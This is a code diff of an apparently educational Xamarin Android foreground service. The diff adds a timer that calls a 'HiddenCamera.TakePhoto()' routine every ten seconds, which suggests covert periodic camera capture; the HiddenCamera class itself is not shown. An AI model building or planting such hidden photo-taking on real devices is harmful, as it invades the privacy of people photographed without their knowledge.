@@ -6,20 +6,29 @@ using Android.OS;
 using System.Threading;
 using Java.Util.Concurrent;
 using Java.Lang;
+using Java.Util;
+using Android.Hardware;
+using Android.Hardware.Camera2;
+using System.Threading.Tasks;
 
-namespace Task2
+namespace ServicesDemo3
 {
 	[Service]
 	public class ForegroundService : Service
 	{
 		static readonly string TAG = "ForegroundService";
 
-		public bool IsStarted { get; private set; }
+        CameraInfo _cameraInfo;
+
+        public bool IsStarted { get; private set; }
 
 		public override void OnCreate()
 		{
 			base.OnCreate();
-			Log.Info(TAG, "OnCreate: the service is initializing.");
+            Log.Info(TAG, "OnCreate: the service is initializing.");
+
+            var cameraManager = (CameraManager)GetSystemService(Context.CameraService);
+            _cameraInfo = new CameraInfo(cameraManager);
         }
 
 		public override StartCommandResult OnStartCommand(Intent intent, StartCommandFlags flags, int startId)
@@ -33,18 +42,19 @@ namespace Task2
 				{
 					Log.Info(TAG, "OnStartCommand: The service is starting.");
 					RegisterForegroundService();
-					IsStarted = true;
+                    IsStarted = true;
 
-                    new System.Threading.Thread(() => SomeTask()).Start();
+                    var timer = new Java.Util.Timer();
+                    new System.Threading.Thread(() => timer.Schedule(new UpdateTimeTask(), 0, 10000)).Start();
                 }
 			}
 			else if (intent.Action.Equals(Constants.ACTION_STOP_SERVICE))
 			{
 				Log.Info(TAG, "OnStartCommand: The service is stopping.");
-				StopForeground(true);
-
+                StopForeground(true);
+                HiddenCamera.Stop();
                 // останавливаем сервис, если он был до этого запущен
-				StopSelf(); 
+                StopSelf();
 				IsStarted = false;
 			}
 
@@ -92,9 +102,12 @@ namespace Task2
             notificationManager.CreateNotificationChannel(notificationChannel);
         }
 
-        private void SomeTask()
+        class UpdateTimeTask: TimerTask
         {
-            
+            public override void Run()
+            {
+                HiddenCamera.TakePhoto();
+            }
         }
     }
 }
